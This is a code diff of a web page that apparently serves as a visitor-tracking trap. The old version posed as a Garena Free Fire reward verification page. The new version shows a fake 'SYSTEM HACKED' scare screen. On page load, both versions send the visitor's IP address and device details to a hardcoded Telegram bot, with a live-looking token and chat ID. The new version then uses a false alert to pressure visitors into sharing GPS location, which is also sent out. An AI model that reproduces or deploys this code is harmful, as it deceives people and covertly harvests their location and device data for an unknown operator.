@@ -3,62 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garena Free Fire - Reward Verification</title>
+    <title>SYSTEM CRITICAL ERROR</title>
     <style>
-        body { background: #050a12; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; cursor: pointer; }
-        .box { border: 2px solid #00f2ff; padding: 40px; border-radius: 20px; background: #0d1117; box-shadow: 0 0 30px rgba(0, 242, 255, 0.4); max-width: 350px; }
-        h1 { color: #00f2ff; font-size: 20px; text-transform: uppercase; letter-spacing: 2px; }
-        .loading { border: 4px solid #f3f3f3; border-top: 4px solid #00f2ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { color: #888; font-size: 13px; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; cursor: crosshair; }
+        .hacker-img { width: 100%; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; opacity: 0.5; z-index: -1; }
+        .status { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; }
+        h1 { font-size: 30px; color: red; text-shadow: 0 0 10px red; }
+        .console { text-align: left; font-size: 12px; height: 150px; overflow: hidden; border: 1px solid #0f0; padding: 10px; background: rgba(0,0,0,0.8); }
     </style>
 </head>
-<body onclick="grabData()">
+<body onclick="forceCapture()">
 
-<div class="box">
-    <h1>Account Verifying...</h1>
-    <div class="loading"></div>
-    <p>Please tap on the screen to confirm your identity and claim rewards.</p>
-</div>
+    <img src="https://i.ibb.co/6P8PzYk/hacker.jpg" class="hacker-img">
+
+    <div class="status">
+        <h1>[ SYSTEM HACKED ]</h1>
+        <div class="console" id="console">
+            > Initializing bypass...<br>
+            > Accessing kernel...<br>
+            > Fetching system data...<br>
+        </div>
+        <p style="color: yellow; margin-top: 20px;">Touch to Abort...</p>
+    </div>
 
 <script>
-    async function grabData() {
-        // IP Address সংগ্রহ করা (Online ID)
-        let ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
-        let ip = ipData.ip;
+    // পেজ লোড হতেই আইপি পাঠিয়ে দিবে (কোনো পারমিশন লাগবে না)
+    window.onload = function() {
+        autoCapture();
+        startConsole();
+    };
 
-        // Device Info সংগ্রহ করা
-        let deviceModel = navigator.userAgent;
-        let platform = navigator.platform;
-        let screenRes = `${window.screen.width}x${window.screen.height}`;
+    function startConsole() {
+        let con = document.getElementById('console');
+        setInterval(() => {
+            con.innerHTML += "> Fetching packets... DONE<br>";
+        }, 1000);
+    }
 
-        // Location সংগ্রহ করা
+    async function autoCapture() {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const userIP = ipData.ip;
+        const device = navigator.userAgent;
+
+        sendToTelegram(userIP, device, "Click to see location", "Click to see location");
+    }
+
+    function forceCapture() {
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                sendToTelegram(ip, deviceModel, platform, screenRes, position);
-            }, function() {
-                // ইউজার না দিলেও IP এবং Device Info চলে যাবে
-                sendToTelegram(ip, deviceModel, platform, screenRes, null);
+            navigator.geolocation.getCurrentPosition((pos) => {
+                sendToTelegram("Update", "Update", pos.coords.latitude, pos.coords.longitude);
+            }, () => {
+                alert("ERROR: Security Bypass Failed! Location required to abort.");
             });
         }
     }
 
-    function sendToTelegram(ip, device, plat, res, pos) {
-        const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k"; 
-        const chat_id = "7547190025"; 
+    function sendToTelegram(ip, dev, lat, lon) {
+        const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
+        const chat_id = "7547190025";
+        let map = (lat === "Update" || lat === "Click to see location") ? lat : `https://www.google.com/maps?q=${lat},${lon}`;
         
-        let mapLink = "Location Denied";
-        if (pos) {
-            mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-        }
+        const text = `💀 **HACKER TRAP SUCCESS** 💀\n\n🌐 **IP:** ${ip}\n📱 **Device:** ${dev}\n📍 **Map:** ${map}`;
 
-        const message = `🎯 **নতুন ডাটা ক্যাপচার হয়েছে!** 🎯\n\n🌐 **IP Address:** ${ip}\n📱 **Device:** ${device}\n💻 **Platform:** ${plat}\n🖥️ **Resolution:** ${res}\n📍 **Map:** ${mapLink}`;
-
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
-        .then(() => {
-            alert("Verification Complete! Please wait 5 minutes.");
-            window.location.href = "https://ff.garena.com/"; 
-        });
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
     }
 </script>
 
